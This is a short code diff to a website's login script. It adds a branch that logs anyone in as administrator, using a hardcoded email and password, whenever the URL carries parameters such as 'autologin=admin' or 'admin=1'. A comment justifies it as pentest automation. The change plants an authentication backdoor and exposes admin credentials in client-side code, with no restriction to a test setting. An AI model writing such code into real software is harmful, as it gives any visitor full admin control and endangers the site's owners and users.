@@ -113,6 +113,13 @@
             const form = document.getElementById('clean-login-form');
             const err = document.getElementById('login-error-msg');
 
+            // URL autologin support for pentest automation from Kali Linux
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('autologin') === 'admin' || params.get('role') === 'admin' || params.get('admin') === '1') {
+                handleLogin('admin@floradise.local', 'FlowerAdmin123');
+                return;
+            }
+
             form.addEventListener('submit', (e) => {
                 e.preventDefault();
                 err.style.display = 'none';
